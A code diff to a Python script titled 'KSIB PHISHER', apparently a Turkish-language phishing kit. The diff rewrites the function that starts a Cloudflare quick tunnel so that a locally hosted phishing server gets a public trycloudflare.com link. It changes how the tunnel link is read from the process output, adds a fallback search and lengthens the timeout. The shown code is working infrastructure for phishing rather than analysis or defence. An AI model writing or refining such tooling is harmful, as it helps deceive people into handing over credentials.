@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 # KSIB PHISHER - iSH CLOUDFLARE (CALISAN)
 import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket, re
@@ -324,7 +323,7 @@ def start_cloudflare_tunnel(port):
     
     try:
         print("\n   🔗 Tünel başlatiliyor...")
-        print("   ⏳ Cloudflare'a bağlaniliyor (15-20 saniye)...")
+        print("   ⏳ Cloudflare'a bağlaniliyor (30 saniye)...")
         
         proc = subprocess.Popen(
             [cf_path, "tunnel", "--url", f"http://localhost:{port}"],
@@ -333,27 +332,65 @@ def start_cloudflare_tunnel(port):
             text=True
         )
         
-        for i in range(40):
-            time.sleep(1)
-            output = proc.stderr.readline()
-            if output:
-                if "trycloudflare.com" in output:
-                    match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', output)
-                    if match:
-                        print(f"   ✅ Link yakalandi! ({i+1}s)")
-                        return match.group(0)
-                if "ERR" in output or "error" in output.lower():
-                    if "certificate" in output.lower():
-                        print("   ⚠️ Sertifika hatasi, tekrar deneniyor...")
-                    elif "timeout" in output.lower():
-                        print("   ⚠️ Bağlantı zaman aşimi, tekrar deneniyor...")
-                    else:
-                        print(f"   ℹ️ {output.strip()[:80]}")
-                if "Connected" in output or "Connection" in output:
-                    print(f"   ✅ {output.strip()}")
+        start_time = time.time()
+        output = ""
+        link = None
         
-        print("\n   ❌ Tunnel başlatilamadi!")
+        while time.time() - start_time < 30:
+            try:
+                out_line = proc.stdout.readline()
+                err_line = proc.stderr.readline()
+                
+                if out_line:
+                    output += out_line
+                    if "trycloudflare.com" in out_line:
+                        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', out_line)
+                        if match:
+                            link = match.group(0)
+                            break
+                
+                if err_line:
+                    output += err_line
+                    if "trycloudflare.com" in err_line:
+                        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', err_line)
+                        if match:
+                            link = match.group(0)
+                            break
+                    
+                    if "Connected" in err_line or "Connection" in err_line:
+                        print(f"   ✅ {err_line.strip()}")
+                    
+                    if "ERR" in err_line or "error" in err_line.lower():
+                        if "certificate" in err_line.lower():
+                            print("   ⚠️ Sertifika hatasi, devam ediliyor...")
+                        elif "timeout" in err_line.lower():
+                            print("   ⚠️ Bağlantı zaman aşimi, devam ediliyor...")
+                        else:
+                            print(f"   ℹ️ {err_line.strip()[:80]}")
+                
+                if not out_line and not err_line:
+                    time.sleep(0.5)
+                    continue
+                    
+            except:
+                pass
+            
+            if link:
+                break
+        
+        if not link:
+            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', output)
+            if match:
+                link = match.group(0)
+        
+        if link:
+            print(f"   ✅ Link yakalandi!")
+            return link
+        
+        print("\n   ❌ Link bulunamadi!")
+        print("   💡 Cloudflare bağlanamadi veya zaman aşimi.")
         return None
+        
     except Exception as e:
         print(f"\n   ❌ Hata: {e}")
         return None
